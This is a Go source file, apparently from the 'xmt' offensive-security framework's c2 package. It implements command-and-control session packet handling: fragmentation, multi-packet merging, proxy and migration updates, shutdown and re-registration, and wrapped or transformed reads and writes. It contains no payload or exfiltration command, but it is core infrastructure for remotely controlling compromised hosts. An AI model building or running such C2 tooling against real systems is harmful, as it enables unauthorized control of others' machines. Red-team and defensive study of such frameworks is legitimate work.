// C2 is the base package for all C2 communication structures and functions.

package c2

import (
	"context"
	"io"
	"net"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	// RvResult is the generic value for indiciating a result value. Packets
	// that have this as their ID value will be forwarded to the authoritative
	// Mux and will be discarded if it does not match an active Job ID.
	RvResult uint8 = 0x14
	// RvMigrate is the ID value returned when a Session Migration has completed.
	// This Packet usually carries the new Device struct data.
	RvMigrate uint8 = 0x13

	fragMax     = 0xFFFF
	readTimeout = time.Millisecond * 250
)

// ID entries that start with 'Sv*' will be handed directly by the underlying
// Session instead of being forwared to the authoritative Mux.
//
// These Packet ID values are used for network congestion and flow control and
// should not be used in standard Packet entries.
const (
	SvProxy    uint8 = 0x1
	SvHello    uint8 = 0x2
	SvRegister uint8 = 0x3 // Considered a MvDrop.
	SvComplete uint8 = 0x4
	SvShutdown uint8 = 0x5
	SvDrop     uint8 = 0x6
)

var (
	// ErrTooManyPackets is an error returned by many of the Packet writing
	// functions when attempts to combine Packets would create a Packet grouping
	// size larger than the maximum size (65535 or 0xFFFF).
	ErrTooManyPackets = xerr.Sub("frag/multi count is larger than 0xFFFF", 0x2C)

	empty time.Time

	buffers = sync.Pool{
		New: func() interface{} {
			return new(data.Chunk)
		},
	}
)

func returnBuffer(c *data.Chunk) {
	c.Clear()
	buffers.Put(c)
}
func isPacketNoP(n *com.Packet) bool {
	return n.ID < 2 && n.Empty() && (n.Flags == 0 || n.Flags == com.FlagProxy)
}
func mergeTags(one, two []uint32) []uint32 {
	if len(one) == 0 && len(two) == 0 {
		return nil
	}
	if len(one) == 0 && len(two) > 0 {
		return two
	}
	if len(one) > 0 && len(two) == 0 {
		return one
	}
	i := len(one)
	if i < len(two) {
		i = len(two)
	}
	t := make(map[uint32]struct{}, i)
	for _, v := range one {
		t[v] = wake
	}
	for _, v := range two {
		t[v] = wake
	}
	r := make([]uint32, 0, len(t))
	for v := range t {
		r = append(r, v)
	}
	return r
}
func readFull(r io.Reader, c int, b []byte) error {
	n, err := r.Read(b)
	if err != nil {
		return err
	}
	if n != c {
		return io.ErrUnexpectedEOF
	}
	return nil
}
func verifyPacket(n *com.Packet, i device.ID) bool {
	if n.Job == 0 && n.Flags&com.FlagProxy == 0 && n.ID > 1 {
		n.Job = uint16(util.FastRand())
	}
	if n.Device.Empty() {
		n.Device = i
		return true
	}
	return n.Device == i
}
func writeFull(w io.Writer, c int, b []byte) error {
	n, err := w.Write(b)
	if err != nil {
		return err
	}
	if n != c {
		return io.ErrShortWrite
	}
	return nil
}
func readSlice(r io.Reader, d *[8]byte) ([]byte, error) {
	if err := readFull(r, 8, (*d)[:]); err != nil {
		return nil, err
	}
	b := make(
		[]byte, uint64(d[7])|uint64(d[6])<<8|uint64(d[5])<<16|uint64(d[4])<<24|
			uint64(d[3])<<32|uint64(d[2])<<40|uint64(d[1])<<48|uint64(d[0])<<56,
	)
	return b, readFull(r, int(len(b)), b)
}
func (p *proxyData) UnmarshalStream(r data.Reader) error {
	if err := r.ReadString(&p.b); err != nil {
		return err
	}
	return r.ReadString(&p.n)
}
func writeSlice(w io.Writer, d *[8]byte, b []byte) error {
	n := uint64(len(b))
	(*d)[0], (*d)[1], (*d)[2], (*d)[3] = byte(n>>56), byte(n>>48), byte(n>>40), byte(n>>32)
	(*d)[4], (*d)[5], (*d)[6], (*d)[7] = byte(n>>24), byte(n>>16), byte(n>>8), byte(n)
	if err := writeFull(w, 8, (*d)[:]); err != nil {
		return err
	}
	return writeFull(w, int(n), b)
}
func receiveSingle(s *Session, l *Listener, n *com.Packet) {
	if s == nil {
		return
	}
	if bugtrack.Enabled {
		bugtrack.Track(
			"c2.receiveSingle(): n.ID=%X, n=%s, n.Flags=%s, n.Device=%s", n.ID, n, n.Flags, n.Device,
		)
	}
	switch n.ID {
	case SvProxy:
		if s.parent == nil {
			return
		}
		if cout.Enabled {
			s.log.Info("[%s] Client indicated that it updated it's Proxy info.", s.ID)
		}
		c, err := n.Uint8()
		if err != nil {
			if cout.Enabled {
				s.log.Error("[%s] Could not Unmarshal Proxy data: %s!", s.ID, err.Error())
			}
			return
		}
		if c == 0 {
			s.updateProxyInfo(nil)
			return
		}
		v := make([]proxyData, c)
		for i := range v {
			if err := v[i].UnmarshalStream(n); err != nil {
				if cout.Enabled {
					s.log.Error("[%s] Could not Unmarshal Proxy data: %s!", s.ID, err.Error())
				}
				return
			}
		}
		s.updateProxyInfo(v)
		return
	case RvMigrate:
		if s.s == nil {
			return
		}
		if cout.Enabled {
			s.log.Info("[%s] Client indicated that it migrated, updating local device information.", s.ID)
		}
		var (
			v   = s.Device
			err = s.Device.UnmarshalStream(n)
		)
		if s.parent = l; err != nil {
			if s.Device = v; cout.Enabled {
				s.log.Error("[%s] Could not Unmarshal device data: %s!", s.ID, err.Error())
			}
		}
	case SvShutdown:
		if s.s != nil {
			if cout.Enabled {
				s.log.Info("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
			}
			s.write(true, &com.Packet{ID: SvShutdown, Job: 1, Device: s.ID})
			s.s.Remove(s.ID, false)
			s.state.Set(stateShutdownWait)
		} else {
			if s.state.Closing() {
				return
			}
			if cout.Enabled {
				s.log.Info("[%s] Server indicated shutdown, closing Session.", s.ID)
			}
		}
		s.close(false)
		return
	case SvRegister:
		if s.s != nil {
			return
		}
		if cout.Enabled {
			s.log.Info("[%s] Server indicated that we must re-register, resending SvRegister info!", s.ID)
		}
		if s.proxy != nil && s.proxy.IsActive() {
			s.proxy.subsRegister()
		}
		v := &com.Packet{ID: SvHello, Job: uint16(util.FastRand()), Device: s.ID}
		s.Device.MarshalStream(v)
		if s.generateSessionKey(v); cout.Enabled {
			s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
		}
		if bugtrack.Enabled {
			bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details [%v].", s.ID, s.key)
		}
		if s.write(true, v); len(s.send) <= 1 {
			s.Wake()
		}
		return
	}
	if n.ID < task.MvRefresh {
		return
	}
	if s.parent == nil {
		s.m.queue(event{p: n, s: s, hf: defaultClientMux})
		return
	}
	s.m.queue(event{p: n, s: s, af: s.handle})
}
func receive(s *Session, l *Listener, n *com.Packet) error {
	if n == nil || n.Device.Empty() || isPacketNoP(n) || (l == nil && s == nil) {
		return nil
	}
	if bugtrack.Enabled {
		bugtrack.Track(
			"c2.receive(): s == nil=%t, l == nil=%t, n.ID=%X, n=%s, n.Flags=%s, n.Device=%s",
			s == nil, l == nil, n.ID, n, n.Flags, n.Device,
		)
	}
	if s != nil && n.Flags&com.FlagMultiDevice == 0 && s.ID != n.Device {
		if s.proxy != nil && s.proxy.IsActive() && s.proxy.accept(n) {
			return nil
		}
		if xerr.Concat {
			return xerr.Sub(`received Packet for "`+n.Device.String()+`" that does not match our own device ID "`+s.ID.String()+`"`, 0x2D)
		}
		return xerr.Sub("received Packet that does not match our own device ID", 0x2D)
	}
	if n.Flags&com.FlagOneshot != 0 {
		l.oneshot(n)
		return nil
	}
	if s == nil || n.ID == SvComplete {
		return nil
	}
	switch {
	case n.Flags&com.FlagMulti != 0:
		x := n.Flags.Len()
		if x == 0 {
			return ErrInvalidPacketCount
		}
		for ; x > 0; x-- {
			v := new(com.Packet)
			if err := v.UnmarshalStream(n); err != nil {
				n.Clear()
				return err
			}
			if cout.Enabled {
				s.log.Trace("[%s] Unpacked Packet %q..", s.ID, v)
			}
			if err := receive(s, l, v); err != nil {
				n.Clear()
				v.Clear()
				return err
			}
		}
		n.Clear()
		return nil
	case n.Flags&com.FlagFrag != 0 && n.Flags&com.FlagMulti == 0:
		if n.ID == SvDrop || n.ID == SvRegister {
			if cout.Enabled {
				s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, n.Flags.Group())
			}
			if s.state.SetLast(n.Flags.Group()); n.ID != SvRegister {
				return nil
			}
			break
		}
		if n.Flags.Len() == 0 {
			return ErrInvalidPacketCount
		}
		if n.Flags.Len() == 1 {
			if cout.Enabled {
				s.log.Trace("[%s] Received a single frag (len=1) for Group %X, clearing Flags!", s.ID, n.Flags.Group())
			}
			n.Flags.Clear()
			return receive(s, l, n)
		}
		if cout.Enabled {
			s.log.Trace("[%s] Received frag for Group %X (%d of %d).", s.ID, n.Flags.Group(), n.Flags.Position()+1, n.Flags.Len())
		}
		var (
			g     = n.Flags.Group()
			c, ok = s.frags[g]
		)
		if !ok && n.Flags.Position() > 0 {
			if s.write(true, &com.Packet{ID: SvDrop, Flags: n.Flags, Device: s.ID}); cout.Enabled {
				s.log.Warning("[%s] Received an invalid Frag Group %X, indicating to drop it!", s.ID, n.Flags.Group())
			}
			return nil
		}
		if !ok {
			c = new(cluster)
			s.frags[g] = c
		}
		if err := c.add(n); err != nil {
			return err
		}
		if v := c.done(); v != nil {
			if delete(s.frags, g); cout.Enabled {
				s.log.Trace("[%s] Completed Frag Group %X, %d total.", s.ID, n.Flags.Group(), n.Flags.Len())
			}
			return receive(s, l, v)
		}
		s.frag(n.Job, n.Flags.Group(), n.Flags.Len(), n.Flags.Position())
		return nil
	}
	receiveSingle(s, l, n)
	return nil
}
func writeUnpack(dst, src *com.Packet, flags, tags bool) error {
	if src == nil || dst == nil {
		return nil
	}
	if src.Flags&com.FlagMulti != 0 || src.Flags&com.FlagMultiDevice != 0 {
		x := src.Flags.Len()
		if x == 0 {
			return ErrInvalidPacketCount
		}
		if x+dst.Flags.Len() > fragMax {
			return ErrTooManyPackets
		}
		src.WriteTo(dst)
		dst.Flags.SetLen(dst.Flags.Len() + x)
		src.Clear()
		return nil
	}
	if dst.Flags.Len()+1 > fragMax {
		return ErrTooManyPackets
	}
	src.MarshalStream(dst)
	if dst.Flags.SetLen(dst.Flags.Len() + 1); flags {
		if src.Flags&com.FlagChannel != 0 {
			dst.Flags |= com.FlagChannel
		}
		if src.Flags&com.FlagMultiDevice != 0 {
			dst.Flags |= com.FlagMultiDevice
		}
	}
	if dst.Flags |= com.FlagMulti; tags && len(src.Tags) > 0 {
		dst.Tags = append(dst.Tags, src.Tags...)
	}
	src.Clear()
	return nil
}
func readPacketFrom(c io.Reader, w Wrapper, n *com.Packet) error {
	if w == nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.readPacketFrom(): Passing read to direct Unmarshal.")
		}
		return n.Unmarshal(c)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.readPacketFrom(): Starting read with Wrapper.")
	}
	i, err := w.Unwrap(c)
	if err != nil {
		return xerr.Wrap("unable to unwrap reader", err)
	}
	if err = n.Unmarshal(i); err != nil {
		return err
	}
	return nil
}
func writePacketTo(c *data.Chunk, w Wrapper, n *com.Packet) error {
	if w == nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.writePacketTo(): Passing write to direct Marshal.")
		}
		return n.Marshal(c)
	}
	o, err := w.Wrap(c)
	if err != nil {
		return xerr.Wrap("unable to wrap writer", err)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.writePacketTo(): n=%s, n.Len()=%d, n.Size()=%d", n, n.Size(), n.Size())
	}
	if err = n.Marshal(o); err != nil {
		return err
	}
	if err = o.Close(); err != nil {
		xerr.Wrap("unable to close wrapper", err)
	}
	return nil
}
func spinTimeout(x context.Context, n string, t time.Duration) net.Conn {
	var (
		y, f = context.WithTimeout(x, t)
		c    net.Conn
	)
	for c == nil {
		select {
		case <-y.Done():
			f()
			return nil
		case <-x.Done():
			f()
			return nil
		default:
			c, _ = pipe.DialContext(y, n)
		}
	}
	f()
	return c
}
func readPacket(c net.Conn, w Wrapper, t Transform) (*com.Packet, error) {
	var n com.Packet
	if w == nil && t == nil {
		if err := n.Unmarshal(&readerTimeout{c: c, t: readTimeout}); err != nil {
			return nil, xerr.Wrap("unable to read from stream", err)
		}
		if bugtrack.Enabled {
			bugtrack.Track("c2.readPacket(): Direct Unmarshal result n=%s", n.String())
		}
		return &n, nil
	}
	var (
		b      = buffers.Get().(*data.Chunk)
		d, err = b.ReadDeadline(c, readTimeout)
	)
	if bugtrack.Enabled {
		bugtrack.Track("c2.readPacket(): ReadDeadline result d=%d, err=%s", d, err)
	}
	if d == 0 {
		if returnBuffer(b); err != nil {
			return nil, xerr.Wrap("unable to read from stream", err)
		}
		return nil, xerr.Wrap("unable to read from stream", io.ErrUnexpectedEOF)
	}
	if t != nil {
		o := buffers.Get().(*data.Chunk)
		err = t.Read(b.Payload(), o)
		if returnBuffer(b); err != nil {
			returnBuffer(o)
			return nil, xerr.Wrap("unable to read from cache", err)
		}
		b = o
	}
	err = readPacketFrom(b, w, &n)
	if returnBuffer(b); err != nil {
		n.Clear()
		return nil, err
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.readPacket(): Unmarshal result n=%s", n.String())
	}
	return &n, nil
}
func writePacket(c net.Conn, w Wrapper, t Transform, n *com.Packet) error {
	if w == nil && t == nil {
		err := n.Marshal(c)
		n.Clear()
		return err
	}
	var (
		b   = buffers.Get().(*data.Chunk)
		err = writePacketTo(b, w, n)
	)
	if n.Clear(); err != nil {
		returnBuffer(b)
		return xerr.Wrap("unable to write to cache", err)
	}
	if t != nil {
		err = t.Write(b.Payload(), c)
	} else {
		_, err = b.WriteTo(c)
	}
	if returnBuffer(b); err != nil {
		return xerr.Wrap("unable to write to stream", err)
	}
	return nil
}
func nextPacket(a notifier, q <-chan *com.Packet, n *com.Packet, i device.ID, t []uint32) (*com.Packet, *com.Packet) {
	if n == nil && len(q) == 0 {
		return nil, nil
	}
	// NOTE(dij): Fast path (if we have a strict limit OR we don't have
	//            anything in queue but we got a packet). So just send that
	//            shit/wrap if needed.
	if limits.Packets <= 1 || (n != nil && len(q) == 0) {
		if n == nil {
			if n = <-q; n == nil {
				return nil, nil
			}
		}
		if a.accept(n.Job); verifyPacket(n, i) {
			n.Tags = append(n.Tags, t...)
			return n, nil
		}
		o := &com.Packet{Device: i, Flags: com.FlagMulti | com.FlagMultiDevice}
		writeUnpack(o, n, true, true)
		o.Tags = append(o.Tags, t...)
		return o, nil
	}
	var (
		o = &com.Packet{Device: i, Flags: com.FlagMulti}
		k *com.Packet
	)
	for x, s, m := 0, 0, false; x < limits.Packets && len(q) > 0; x++ {
		if n == nil {
			n = <-q
		}
		// need to add a check here to see if len(c) == 0
		// if so, drop a SvNop and return only the first
		if isPacketNoP(n) && ((s > 0 && !m) || (n.Device.Empty() || n.Device == i)) {
			n.Clear()
			n = nil
			continue
		}
		// Rare case a single packet (which was already chunked,
		// is bigger than the frag size, shouldn't happen but *shrug*)
		// s would be zero on the first round, so just send that one and "fuck it"
		if s > 0 {
			if s += n.Size(); s > limits.Frag {
				k = n
				break
			}
		} else {
			s += n.Size()
		}
		// Set multi device flag if theres a packet in queue that doesn't match us.
		if a.accept(n.Job); !verifyPacket(n, i) && !m {
			o.Flags |= com.FlagMultiDevice
			m = true
		}
		writeUnpack(o, n, true, true)
		n = nil
	}
	// If we get a single packet, unpack it and send it instead.
	// I don't think there's a super good way to do this, as we clear most of the
	// data during write. IE: we have >1 NOPs and just a single data Packet.
	if o.Flags.Len() == 1 && o.Flags&com.FlagMultiDevice == 0 && o.ID == 0 {
		v := new(com.Packet)
		v.UnmarshalStream(o)
		o.Clear()
		// Remove reference
		o = nil
		o = v
	}
	return o, k
}
